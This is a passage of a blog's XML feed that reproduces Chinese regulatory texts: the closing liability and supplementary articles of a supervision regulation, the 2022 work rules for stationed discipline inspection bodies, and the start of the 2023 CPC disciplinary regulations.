href="#第八章-法律责任" class="headerlink" title="第八章 法律责任"></a>第八章 法律责任</h2><p>  第三百一十四条  有关单位拒不执行监察机关依法作出的下列处理决定的，应当由其主管部门、上级机关责令改正，对单位给予通报批评，对负有责任的领导人员和直接责任人员依法给予处理：</p><p>  （一）政务处分决定；</p><p>  （二）问责决定；</p><p>  （三）谈话提醒、批评教育、责令检查，或者予以诫勉的决定；</p><p>  （四）采取调查措施的决定；</p><p>  （五）复审、复核决定；</p><p>  （六）监察机关依法作出的其他处理决定。</p><p>  第三百一十五条  监察对象对控告人、申诉人、批评人、检举人、证人、监察人员进行打击、压制等报复陷害的，监察机关应当依法给予政务处分。构成犯罪的，依法追究刑事责任。</p><p>  第三百一十六条  控告人、检举人、证人采取捏造事实、伪造材料等方式诬告陷害的，监察机关应当依法给予政务处分，或者移送有关机关处理。构成犯罪的，依法追究刑事责任。</p><p>  监察人员因依法履行职责遭受不实举报、诬告陷害、侮辱诽谤，致使名誉受到损害的，监察机关应当会同有关部门及时澄清事实，消除不良影响，并依法追究相关单位或者个人的责任。</p><p>  第三百一十七条  监察机关应当建立健全办案安全责任制。承办部门主要负责人和调查组组长是调查安全第一责任人。调查组应当指定专人担任安全员。</p><p>  地方各级监察机关履行管理、监督职责不力发生严重办案安全事故、事件的，或者办案中存在严重违规违纪违法行为的，省级监察机关主要负责人应当按规定向国家监察委员会作出检讨，并予以通报、严肃追责问责。</p><p>  案件监督管理部门应当对办案安全责任制落实情况组织经常性检查和不定期抽查，发现问题及时报告并督促整改。</p><p>  第三百一十八条  监察人员在履行职责中有下列行为之一的，依法严肃处理；构成犯罪的，依法追究刑事责任：</p><p>  （一）贪污贿赂、徇私舞弊的；</p><p>  （二）不履行或者不正确履行监督职责，应当发现的问题没有发现，或者发现问题不报告、不处置，造成严重影响的；</p><p>  （三）未经批准、授权处置问题线索，发现重大案情隐瞒不报，或者私自留存、处理涉案材料的；</p><p>  （四）利用职权或者职务上的影响干预调查工作的；</p><p>  （五）违法窃取、泄露调查工作信息，或者泄露举报事项、举报受理情况以及举报人信息的；</p><p>  （六）对被调查人或者涉案人员等逼供、诱供，或者侮辱、打骂、虐待、体罚或者变相体罚的；</p><p>  （七）违反规定处置查封、扣押、冻结的财物的；</p><p>  （八）违反规定导致发生办案安全事故、事件，或者发生安全事故、事件后隐瞒不报、报告失实、处置不当的；</p><p>  （九）违反规定采取强制到案、责令候查、管护、留置或者禁闭措施，或者法定期限届满，不予以解除或者变更的；</p><p>  （十）违反规定采取技术调查、限制出境措施，或者不按规定解除技术调查、限制出境措施的；</p><p>  （十一）利用职权非法干扰企业生产经营或者侵害企业经营者人身权利、财产权利和其他合法权益的；</p><p>  （十二）其他职务违法和职务犯罪行为。</p><p>  第三百一十九条  对监察人员在履行职责中存在违法行为的，可以根据情节轻重，依法进行谈话提醒、批评教育、责令检查、诫勉，或者给予政务处分。构成犯罪的，依法追究刑事责任。</p><p>  第三百二十条  监察机关及其工作人员在行使职权时，具有下列情形之一的，受害人可以申请国家赔偿：</p><p>  （一）违法采取管护、禁闭措施，或者依照法定条件和程序采取管护、禁闭措施，但是管护时间、禁闭时间超过法定时限，其后决定撤销案件的；</p><p>  （二）采取留置措施后，决定撤销案件的；</p><p>  （三）违法没收、追缴或者违法查封、扣押、冻结财物造成损害的；</p><p>  （四）违法行使职权，造成被调查人、涉案人员或者证人身体伤害或者死亡的；</p><p>  （五）其他侵犯公民、法人和其他组织合法权益造成损害的。</p><p>  受害人死亡的，其继承人和其他有扶养关系的亲属有权要求赔偿；受害的法人或者其他组织终止的，其权利承受人有权要求赔偿。</p><p>  第三百二十一条  监察机关及其工作人员违法行使职权侵犯公民、法人和其他组织的合法权益造成损害的，该机关为赔偿义务机关。申请赔偿应当向赔偿义务机关提出，由该机关负责复审复核工作的部门受理。</p><p>  赔偿以支付赔偿金为主要方式。能够返还财产或者恢复原状的，予以返还财产或者恢复原状。</p><h2 id="第九章-附-则"><a href="#第九章-附-则" class="headerlink" title="第九章  附    则"></a>第九章  附    则</h2><p>  第三百二十二条  本条例所称监察机关，包括各级监察委员会及其派驻或者派出监察机构、监察专员，以及再派出的监察机构、监察专员。</p><p>  第三百二十三条  本条例所称严重职务违法，是指根据监察机关已经掌握的事实及证据，被调查人涉嫌的职务违法行为情节严重，可能被给予撤职以上政务处分。</p><p>  本条例所称重大职务犯罪、重大贪污贿赂等职务犯罪，是指具有下列情形之一的职务犯罪：</p><p>  （一）案情重大、复杂，涉及国家利益、重大公共利益或者犯罪行为致使公共财产、国家和人民利益遭受特别重大损失的；</p><p>  （二）被调查人可能被判处十年有期徒刑以上刑罚的；</p><p>  （三）案件在全国或者本省、自治区、直辖市范围内有较大影响的。</p><p>  第三百二十四条  本条例所称同种罪行和不同种罪行，应当以罪名区分，但属选择性罪名或者在法律、事实上密切关联的犯罪，应当认定为同种罪行。</p><p>  第三百二十五条  本条例所称近亲属，是指夫、妻、父、母、子、女、同胞兄弟姊妹。</p><p>  第三百二十六条  本条例所称以上、以下、以内，包括本级、本数。</p><p>  第三百二十七条  期间以时、日、月、年计算，期间开始的时和日不算在期间以内。本条例另有规定的除外。</p><p>  按照年、月计算期间的，到期月的对应日为期间的最后一日；没有对应日的，月末日为期间的最后一日。</p><p>  期间的最后一日是节假日的，以节假日结束的次日为期间的最后一日。但被调查人被采取责令候查、管护、留置或者禁闭措施的期间应当至期满之日为止，不得因节假日而延长。</p><p>  第三百二十八条  本条例由国家监察委员会负责解释。</p><p>  第三百二十九条  本条例自发布之日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纪检监察机关派驻机构工作规则（2022年6月22日）</title>
      <link href="/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/"/>
      <url>/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>  <strong>第一条</strong> 为了加强和规范纪检监察机关派驻机构工作，根据《中国共产党纪律检查委员会工作条例》和《中华人民共和国监察法》，制定本规则。</p><p>  <strong>第二条</strong> 派驻机构工作坚持以习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，坚持自我革命，坚持敢于斗争，坚持实事求是，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，建立健全系统集成、协同高效的派驻监督体制机制，增强“派”的权威和“驻”的优势，一体推进不敢腐、不能腐、不想腐，充分发挥监督保障执行、促进完善发展作用。</p><p>  <strong>第三条</strong> 在党中央集中统一领导下，中央纪律检查委员会国家监察委员会向中央一级党和国家机关以及其他组织派驻纪检监察机构，地方各级纪律检查委员会监察委员会向本级党和国家机关以及其他组织派驻纪检监察机构。派驻机构是派出机关的组成部分，与驻在单位是监督和被监督的关系。</p><p>  派驻机构应当强化政治监督，把坚持和加强党的领导贯穿工作全过程各方面，推动驻在单位切实做到“两个维护”，贯彻党的理论和路线方针政策，落实党中央决策部署。</p><p>  <strong>第四条</strong> 派驻机构遵循以下原则开展工作：</p><p>  （一）坚持党中央集中统一领导，强化组织自上而下的监督功能；</p><p>  （二）坚持民主集中制，重要事项集体研究决定；</p><p>  （三）坚持敢于善于监督，完善常态化监督工作机制；</p><p>  （四）坚持职责定位，依规依纪依法履行职责；</p><p>  （五）坚持各项监督统筹衔接，推动全面从严治党主体责任和监督责任一体落实；</p><p>  （六）坚持监督与被监督相统一，自觉接受各方面监督。</p><p><strong>第五条</strong> 派驻机构应当持续深化转职能、转方式、转作风，聚焦全面从严治党、党风廉政建设和反腐败工作，强化监督职责，突出工作重点，创新履职方式，有效运用“四种形态”，增强派驻监督全覆盖的有效性，推动派驻监督工作高质量发展。</p><h2 id="第二章-组织设置"><a href="#第二章-组织设置" class="headerlink" title="第二章 组织设置"></a>第二章 组织设置</h2><p>  <strong>第六条</strong> 中央纪律检查委员会国家监察委员会向中央一级党和国家机关、中管金融企业派驻纪检监察组。地方各级纪律检查委员会监察委员会向本级党和国家机关、所管辖的国有金融企业派驻纪检监察组。</p><p>  中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会按照规定向国有企业、普通高等学校等单位派驻纪检监察组；或者依法派驻监察机构，派驻监察专员并设立监察专员办公室，与该单位党的纪律检查机构合署办公。</p><p>  对系统规模大、直属单位多、监督对象多的单位，可以单独派驻纪检监察组；对业务关联度高，或者需要统筹力量实施监督的相关单位，可以综合派驻纪检监察组。</p><p>  <strong>第七条</strong> 派驻机构主要负责人按照规定担任驻在单位的党组（党委）成员，履行监督专责，不分管驻在单位工作。</p><p>  派驻机构主要负责人实行交流任职、定期轮岗。</p><p>  <strong>第八条</strong> 派驻机构的领导机构是组务会。组务会由派驻机构正职、副职组成。组务会会议学习贯彻落实党中央决策部署，贯彻中央纪委国家监委工作部署，落实派出机关工作安排，研究讨论管辖范围内纪检监察工作的重要问题、重要事项，按照权限讨论或者决定党纪政务处分等事项。</p><p>  派驻机构应当健全组务会会议以及组长办公会议、专题会议等会议制度，完善议事决策机制。</p><p>  <strong>第九条</strong> 派驻机构应当按照信访举报、监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的原则，结合实际设置内设机构或者明确人员分工。</p><h2 id="第三章-领导体制"><a href="#第三章-领导体制" class="headerlink" title="第三章 领导体制"></a>第三章 领导体制</h2><p>  <strong>第十条</strong> 各级党委应当加强对纪检监察机关派驻机构工作的领导，健全机构设置、干部管理、工作保障等机制，听取纪律检查委员会监察委员会关于派驻监督工作的汇报，推动派驻机构履职尽责。</p><p>  <strong>第十一条</strong> 驻在单位应当支持配合派驻机构工作，主动及时通报重要情况、重要问题，根据派驻机构工作需要提供有关材料，为派驻机构开展工作创造条件、提供保障。</p><p>  <strong>第十二条</strong> 派驻机构由派出机关直接领导、统一管理，向派出机关负责，受派出机关监督。</p><p>  各级纪律检查委员会常务委员会应当定期听取派驻监督工作情况报告。派出机关分管领导应当定期召开派驻机构负责人会议，经常同派驻机构主要负责人研究工作。</p><p>  <strong>第十三条</strong> 派出机关相关部门根据职能职责，加强对派驻机构的指导、联系、服务和保障。</p><p>  监督检查部门协助分管领导联系派驻机构日常工作：</p><p>  （一）指导督促派驻机构履行职责；</p><p>  （二）对派驻机构请示报告的问题、事项进行审核把关；</p><p>  （三）对派出机关交办的重要案件、事项进行督促办理；</p><p>  （四）办理派驻机构提请支持、协调的重要事项；</p><p>  （五）向派驻机构通报驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员的一般性问题和谈话提醒、批评教育、责令检查、诫勉谈话等情况；</p><p>  （六）联系开展其他工作。</p><p>  <strong>第十四条</strong> 派出机关相关部门应当会同派驻机构联合开展以下监督工作：</p><p>  （一）开展专项检查，推动驻在单位落实党中央决策部署；</p><p>  （二）研判驻在单位政治生态，有针对性地开展监督；</p><p>  （三）开展专题调查研究，查找分析利用公共权力和资源设租寻租、离职后违规从业等行业性、系统性廉洁风险，向驻在单位提出意见建议或者督促开展专项治理；</p><p>  （四）支持配合派出机关同级党委巡视巡察机构开展工作，对整改情况进行监督；</p><p>  （五）推动驻在单位落实纪检监察建议；</p><p>  （六）其他需要联合开展的监督工作。</p><p>  <strong>第十五条</strong> 派出机关监督检查部门、审查调查部门对于派驻机构管辖的重大、复杂案件，经批准可以直接办理或者组织、指挥办理。</p><p>  <strong>第十六条</strong> 派出机关相关部门应当指导、协调派驻机构与地方纪律检查委员会监察委员会协作开展以下工作：</p><p>  （一）协同开展专项检查、专项监督，推动解决有关系统和领域的突出问题；</p><p>  （二）协作采取监督检查、审查调查措施；</p><p>  （三）协商确定驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件的管辖，或者由派驻机构报请派出机关指定有关地方纪委监委管辖；</p><p>  （四）联合审查调查驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件；</p><p>  （五）其他需要协作开展的工作。</p><p>  <strong>第十七条</strong> 派出机关相关部门应当组织、指导各派驻机构之间协作配合开展以下工作：</p><p>  （一）针对共性或者关联性问题同步开展专项监督；</p><p>  （二）对重大、复杂案件进行联合审查调查；</p><p>  （三）协作开展案件审理、复议复查和复审工作；</p><p>  （四）对派出机关部署的重要工作落实情况开展交叉检查或者联合检查；</p><p>  （五）联合开展调研、培训；</p><p>  （六）其他需要协作配合开展的工作。</p><p>  <strong>第十八条</strong> 派驻机构应当加强对驻在单位内设纪检机构及直属单位纪检机构的业务指导和监督检查，督促、支持其发挥职能作用，推动纪检干部队伍建设，加强政治教育和业务培训，协调人员力量开展监督执纪工作。</p><p>  <strong>第十九条</strong> 派驻垂直管理单位的纪检监察组应当加强对驻在单位的下一级单位纪检机构的业务指导和监督检查，对驻在单位各级纪检机构的工作进行统筹，推动层层落实监督责任。下一级单位纪检机构的监督执纪工作以派驻纪检监察组领导为主，线索处置和案件查办在向同级党组（党委）报告的同时应当一并向派驻纪检监察组报告。</p><p>  实行双重领导并以上级单位领导为主的单位，国有企业、国有金融企业的派驻机构工作，参照前款规定执行。</p><p>  <strong>第二十条</strong>各级纪律检查委员会监察委员会派出的机关纪检监察工作委员会，按照规定审理有关派驻机构审查调查的案件，定期向派出机关报告案件审理工作情况。在派出机关领导下，建立健全案件质量评查机制，向派驻机构反馈评查结果。</p><p>  机关纪检监察工作委员会应当加强与派驻机构的沟通协调，对本级党和国家机关部门机关纪委的执纪审查工作进行协同指导。</p><p>  <strong>第二十一条</strong> 派驻国有资产监管机构、教育行政部门等的纪检监察组，按照规定协助派出机关加强对国有企业、普通高等学校等单位派驻机构工作的指导，形成监督合力。</p><p>  派驻国有资产监管机构的纪检监察组，应当加强对驻在单位党组（党委）管理领导班子的国有企业纪检机构监督执纪工作的领导。相关国有企业纪检机构的线索处置和案件查办在向同级党委报告的同时，应当一并向派驻纪检监察组报告。</p><h2 id="第四章-工作职责"><a href="#第四章-工作职责" class="headerlink" title="第四章 工作职责"></a>第四章 工作职责</h2><p>  <strong>第二十二条</strong> 派驻机构依规依纪依法履行监督执纪问责和监督调查处置职责。</p><p>  <strong>第二十三条</strong> 派驻机构应当把监督作为基本职责，结合驻在单位实际，重点监督检查以下情况：</p><p>  （一）对党忠诚，践行党的性质宗旨情况；</p><p>  （二）贯彻党的理论和路线方针政策、落实党中央决策部署、践行“两个维护”情况；</p><p>  （三）落实全面从严治党主体责任、加强党风廉政建设和反腐败工作情况；</p><p>  （四）贯彻执行民主集中制、依规依法履职用权、廉洁自律等情况。</p><p>  <strong>第二十四条</strong> 派驻机构应当重点监督以下对象：</p><p>  （一）驻在单位领导班子及其成员特别是主要负责人；</p><p>  （二）驻在单位上级党委管理的其他人员；</p><p>  （三）驻在单位党组（党委）管理的领导班子及其成员；</p><p>  （四）其他列入重点监督对象的驻在单位人员。</p><p>  <strong>第二十五条</strong> 派驻机构应当支持和督促驻在单位党组（党委）落实全面从严治党主体责任，协助其开展内部巡视巡察，推动驻在单位深化改革、健全制度、完善治理、防控风险。</p><p>  <strong>第二十六条</strong> 派驻机构应当结合派驻监督工作情况，推动驻在单位党组（党委）开展全面从严治党、党风廉政建设和反腐败工作的形势任务教育，强化纪法教育、警示教育，推进廉洁文化建设，教育引导党员、干部以及监察对象修身律己，筑牢思想道德防线。</p><p>  <strong>第二十七条</strong> 派驻机构对反映驻在单位党组织和党员、干部以及监察对象问题的检举控告，按照规定受理和处置。</p><p>  <strong>第二十八条</strong> 派驻机构对驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员涉嫌违纪和职务违法、职务犯罪问题线索，经批准可以参与派出机关的初步核实、审查调查工作。</p><p>  <strong>第二十九条</strong> 派驻机构负责审查以下党组织和党员涉嫌违犯党纪的案件：</p><p>  （一）驻在单位党组（党委）直接领导的党组织；</p><p>  （二）驻在单位党组（党委）管理的领导班子成员；</p><p>  （三）本规则第二十四条第四项规定的人员。</p><p>  派驻机构必要时可以审查驻在单位党组（党委）管理的其他党组织和党员涉嫌违犯党纪的案件。</p><p>  派驻机构根据派出机关授权，依法调查驻在单位监察对象涉嫌职务违法、职务犯罪案件。</p><p>  <strong>第三十条</strong> 派驻机构按照管理权限，对违纪违法的驻在单位党组织和党员、干部以及监察对象进行处理处分，对不履行或者不正确履行职责的驻在单位党组织和领导干部进行问责。</p><p>  <strong>第三十一条</strong> 派驻机构负责受理和处置以下申诉或者复审申请：</p><p>  （一）党组织和党员对派驻机构所作处理决定不服的申诉；</p><p>  （二）监察对象对派驻机构所作处理决定不服的复审申请；</p><p>  （三）被调查人及其近亲属对派驻机构及其工作人员侵害被调查人合法权益行为的申诉。</p><p>  对于派驻机构立案审查调查后由驻在单位作出处理决定案件的申诉或者复核申请，派驻机构应当协助驻在单位做好有关处置工作。</p><h2 id="第五章-履职程序"><a href="#第五章-履职程序" class="headerlink" title="第五章 履职程序"></a>第五章 履职程序</h2><p>  <strong>第三十二条</strong> 派驻机构开展日常监督应当深入实际、深入群众，监督方式包括：</p><p>  （一）参加会议。参加或者列席驻在单位领导班子会议等重要会议，了解学习贯彻党中央决策部署以及上级党组织决定情况和班子成员的意见态度，“三重一大”决策制度执行情况，按照规定向派出机关报告。</p><p>  （二）谈心谈话。同党员、干部和群众广泛谈心谈话，听取对监督对象的反映，发现监督对象存在苗头性、倾向性问题的，进行谈话提醒、批评教育。</p><p>  （三）听取汇报。听取驻在单位党组（党委）管理的领导班子及其成员履行管党治党责任情况的汇报，发现责任落实不到位的，进行提醒纠正。</p><p>  （四）查阅资料。按照规定查阅、复制驻在单位有关文件、资料、数据等材料，了解核实有关情况。</p><p>  （五）沟通情况。加强与驻在单位机关党委、党委办公室和组织人事、巡视巡察、法规法务、财务审计等部门的沟通，及时发现和通报问题。</p><p>  （六）分析研判。分析信访举报、党风廉政等情况，对典型性、普遍性问题向驻在单位提出意见建议。</p><p>  （七）廉政把关。建立健全、动态更新驻在单位党组（党委）管理的领导干部廉政档案，严把党风廉政意见回复关。</p><p>  （八）实地调查。开展驻点调研、现场核查，精准发现驻在单位存在的突出问题。</p><p>  （九）其他开展日常监督的方式。</p><p>  <strong>第三十三条</strong> 派驻机构应当严格执行报告制度，发现驻在单位领导班子及其成员重要问题、重要事项及时向派出机关报告。</p><p>  派驻机构应当经常对驻在单位领导班子及其成员坚持党的领导、加强党的建设、履行全面从严治党主体责任情况以及党风廉政状况进行分析，每年向派出机关提交专题报告。</p><p>  &nbsp;<strong>第三十四条</strong> 派驻机构应当定期会同驻在单位党组（党委）专题研究全面从严治党、党风廉政建设和反腐败工作。派出机关监督检查部门根据情况派员参加。</p><p>  派驻机构主要负责人应当经常与驻在单位党组（党委）主要负责人就政治生态、作风建设、廉洁风险等情况交换意见，提出工作建议，督促完善有关制度措施。</p><p>  <strong>第三十五条</strong> 派驻机构应当向驻在单位领导班子成员通报其分管部门和单位领导干部遵守党章党规党纪、廉洁自律等情况，推动领导班子成员落实“一岗双责”要求，抓好分管部门和单位的党风廉政建设工作。</p><p>  <strong>第三十六条</strong> 派驻机构对驻在单位开展内部巡视巡察提供以下协助：</p><p>  （一）通报监督执纪执法中发现的问题；</p><p>  （二）处置内部巡视巡察移交的问题线索；</p><p>  （三）检查整改责任落实情况；</p><p>  （四）其他协助内部巡视巡察的工作。</p><p>  <strong>第三十七条</strong> 派驻机构应当指定专人负责管理涉嫌违纪和职务违法、职务犯罪问题线索，逐件编号登记，建立管理台账。</p><p>  派驻机构应当结合日常监督掌握的情况，对问题线索进行综合分析、适当了解，采取谈话函询、初步核实、暂存待查、予以了结等方式进行处置。线索处置意见应当自收到线索之日起1个月内提出。</p><p>  处置问题线索应当报派驻机构主要负责人审批，并按照规定报派出机关备案。</p><p>  <strong>第三十八条</strong> 派驻机构经过初步核实，需要进行立案审查调查的，应当报派驻机构主要负责人审批。其中，对驻在单位党组（党委）直接领导的党组织、党组（党委）管理的领导班子成员中的正职领导干部立案和副职领导干部涉嫌严重职务违法、职务犯罪立案的，应当报派出机关审批。</p><p>  派驻机构在立案前应当征求驻在单位党组（党委）主要负责人意见，对于有不同意见的应当报派出机关决定。确因安全保密等特殊情况，经派出机关同意，也可以在立案后及时向驻在单位党组（党委）主要负责人通报。</p><p>  <strong>第三十九条</strong> 派驻机构按照规定报批后，可以依规依纪依法采取谈话、讯问、询问、留置、查询、冻结、搜查、调取、查封、扣押（暂扣、封存）、勘验检查、鉴定措施。对依法应当交有关机关执行的措施，报派出机关审批并以派出机关名义办理。</p><p>  派驻机构应当对审查调查措施进行严格监管，建立措施使用台账，定期将有关情况报派出机关案件监督管理部门、监督检查部门备案。</p><p>  <strong>第四十条</strong> 派驻机构审查调查工作结束后，应当按照规定进行审理，提出纪律处理或者党纪处分建议、拟作出的政务处分决定或者处分建议，通报驻在单位党组（党委）。</p><p>  <strong>第四十一条</strong> 驻在单位党组（党委）按照权限和程序，对违纪的党组织、党员作出纪律处理或者党纪处分决定。</p><p>  派驻机构按照管理权限，对违法的监察对象依法作出政务处分决定；建议驻在单位处分的，由驻在单位依法依规作出处分决定。</p><p>  派驻机构提出的处理处分建议与驻在单位党组（党委）的意见不同又不能协商一致的，由派驻机构报派出机关研究决定。</p><p>  <strong>第四十二条</strong> 派驻机构发现驻在单位党组（党委）管理的党组织和领导干部失职失责造成严重后果或者恶劣影响，需要进行问责调查的，应当报派驻机构主要负责人审批后，启动问责调查程序。</p><p>  派驻机构应当依规依纪依法开展问责调查，查明失职失责问题，按照管理权限作出问责决定，或者向有权作出问责决定的党组织（单位）提出问责建议。</p><p>  对党组织采取改组方式问责的，按照党章和其他党内法规规定的权限、程序执行。对领导干部采取党纪政务处分方式问责的，按照本规则第三十八条、第四十条、第四十一条办理。</p><p>  <strong>第四十三条</strong> 派驻机构对调查的监察对象和涉案人员涉嫌职务犯罪案件，经集体审议，认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法依规移送人民检察院审查起诉。</p><p>  <strong>第四十四条</strong> 派驻机构发现驻在单位在贯彻党中央决策部署、落实全面从严治党主体责任、开展党风廉政建设以及决策机制、监督管理、制度执行等方面存在突出问题或者薄弱环节的，应当提出纪检监察建议。</p><p>派驻机构应当加强对驻在单位问题整改情况的监督检查，督促限期整改、反馈，推动纪检监察建议落实到位。</p><h2 id="第六章-管理监督"><a href="#第六章-管理监督" class="headerlink" title="第六章 管理监督"></a>第六章 管理监督</h2><p>  <strong>第四十五条</strong> 派驻机构必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，以党的政治建设为统领推进党的各方面建设，教育引导派驻机构干部忠于职守、履职尽责，不断提高政治判断力、政治领悟力、政治执行力，带头增强“四个意识”、坚定“四个自信”、做到“两个维护”，发扬党的优良传统和作风，加强思想淬炼、政治历练、实践锻炼、专业训练，增强法治意识、程序意识、证据意识，建设政治素质高、忠诚干净担当、专业化能力强、敢于善于斗争的派驻机构干部队伍。</p><p>  派驻机构党组织应当严格执行党的组织生活制度，推进党支部标准化规范化建设，增强党组织政治功能和组织力凝聚力，发挥战斗堡垒作用。</p><p>  <strong>第四十六条</strong> 派出机关应当严把派驻机构干部入口关，按照干部管理权限统筹派出机关和派驻机构干部的选拔任用、人员交流、考核培训、监督管理，有计划地安排派驻机构干部参与派出机关工作、进行培养锻炼。</p><p>  <strong>第四十七条</strong> 派出机关应当每年组织派驻机构主要负责人进行述责述廉。结合驻在单位特点，对派驻机构履行职责以及自身建设等方面情况进行考核。考核中，应当听取驻在单位领导班子和有关方面的意见，并将其作为考核的重要依据。</p><p>  <strong>第四十八条</strong> 派驻机构应当加强规范化、法治化、正规化建设，明确职权范围，健全内控机制，规范工作流程和审批权限，完善回避、保密和过问、干预案件登记备案等管理制度，建立健全办案安全责任制，推动各项工作依规依纪依法进行。</p><p>  <strong>第四十九条</strong> 派驻机构应当坚持打铁必须自身硬，坚持严的标准，勇于刀刃向内，牢固树立监督者更要自觉接受监督的意识，加强自我管理、自我约束，不断提高免疫力，切实防治“灯下黑”。</p><p>  派驻机构应当接受派出机关同级党委巡视巡察监督和派出机关的管理监督，对所提监督意见进行整改落实，并报告整改情况。</p><p>  派驻机构应当明确专门机构或者人员负责干部日常管理监督工作，及时汇总各方面意见，对自身权力运行的关键环节进行经常性检查，认真核查相关检举控告，按照规定将处置情况向派出机关干部监督部门报告。</p><p>  派驻机构应当听取驻在单位领导班子对派驻机构工作的意见建议，认真研究处理，并及时反馈。自觉接受驻在单位党员、干部和群众的监督，畅通意见反映渠道，对反映的问题进行调查核实处置，不断完善制度、改进工作。</p><p>  <strong>第五十条</strong> 派驻机构干部有跑风漏气、迟报瞒报、滥用职权、以案谋私以及其他违规违纪违法行为的，依规依纪依法严肃处理；构成犯罪的，依法追究刑事责任。</p><p>  <strong>第五十一条</strong> 派驻机构及其领导干部不履行或者不正确履行职责，导致应当发现的问题没有发现，或者发现问题不报告不处置，执纪执法不严格不规范，造成严重后果或者恶劣影响的，予以严肃问责。</p><h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h2><p>  <strong>第五十二条</strong> 本规则涉及的审批权限均指最低审批权限，工作中根据需要可以按照更高层级的审批权限报批。</p><p>  <strong>第五十三条</strong> 派驻国有企业、普通高等学校的监察机构、监察专员（监察专员办公室）除执行本规则外，还应当执行中央纪律检查委员会国家监察委员会相关规定。</p><p>  <strong>第五十四条</strong> 中央军事委员会可以根据本规则制定相关细则。</p><p>  <strong>第五十五条</strong> 本规则由中央纪律检查委员会国家监察委员会负责解释。</p><p>  <strong>第五十六条</strong> 本规则自发布之日起施行。此前发布的其他有关纪检监察机关派驻机构工作的规定，凡与本规则不一致的，按照本规则执行。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 监督制度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国共产党纪律处分条例（2023年12月19日）</title>
      <link href="/2024/10/17/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E5%A4%84%E5%88%86%E6%9D%A1%E4%BE%8B%EF%BC%882023%E5%B9%B412%E6%9C%8819%E6%97%A5%EF%BC%89/"/>
      <url>/2024/10/17/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E5%A4%84%E5%88%86%E6%9D%A1%E4%BE%8B%EF%BC%882023%E5%B9%B412%E6%9C%8819%E6%97%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="第一编-总则"><a href="#第一编-总则" class="headerlink" title="第一编　总则"></a>第一编　总则</h2><h3 id="第一章-总体要求和适用范围"><a href="#第一章-总体要求和适用范围" class="headerlink" title="第一章　总体要求和适用范围"></a>第一章　总体要求和适用范围</h3><p>  <strong>第一条</strong>　为了维护党章和其他党内法规，严肃党的纪律，纯洁党的组织，保障党员民主权利，教育党员遵纪守法，维护党的团结统一，保证党的理论、路线、方针、政策、决议和国家法律法规的贯彻执行，根据《中国共产党章程》，制定本条例。</p><p>  <strong>第二条</strong>　党的纪律建设必须坚持以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，坚持和加强党的全面领导，坚决维护习近平总书记党中央的核心、全党的核心地位，坚决维护以习近平同志为核心的党中央权威和集中统一领导，弘扬伟大建党精神，坚持自我革命，贯彻全面从严治党战略方针，落实新时代党的建设总要求，推动解决大党独有难题、健全全面从严治党体系，全面加强党的纪律建设，为以中国式现代化全面推进强国建设、民族复兴伟业提供坚强纪律保障。</p><p>  <strong>第三条</strong>　党章是最根本的党内法规，是管党治党的总规矩。党的纪律是党的各级组织和全体党员必须遵守的行为规则。党组织和党员必须坚守初心使命，牢固树立政治意识、大局意识、核心意识、看齐意识，始终坚定道路自信、理论自信、制度自信、文化自信，切实践行正确的权力观、政绩观、事业观，自觉遵守和维护党章，严格执行和维护党的纪律，自觉接受党的纪律约束，模范遵守国家法律法规。</p><p>  <strong>第四条</strong>　党的纪律处分工作遵循下列原则：</p><p>  （一）坚持党要管党、全面从严治党。把严的基调、严的措施、严的氛围长期坚持下去，加强对党的各级组织和全体党员的教育、管理和监督，把纪律挺在前面，抓早抓小、防微杜渐。</p><p>  （二）党纪面前一律平等。对违犯党纪的党组织和党员必须严肃、公正执行纪律，党内不允许有任何不受纪律约束的党组织和党员。</p><p>  （三）实事求是。对党组织和党员违犯党纪的行为，应当以事实为依据，以党章、其他党内法规和国家法律法规为准绳，执纪执法贯通，准确认定行为性质，区别不同情况，恰当予以处理。</p><p>  （四）民主集中制。实施党纪处分，应当按照规定程序经党组织集体讨论决定，不允许任何个人或者少数人擅自决定和批准。上级党组织对违犯党纪的党组织和党员作出的处理决定，下级党组织必须执行。</p><p>  （五）惩前毖后、治病救人。处理违犯党纪的党组织和党员，应当实行惩戒与教育相结合，做到宽严相济。</p><p>  <strong>第五条</strong>　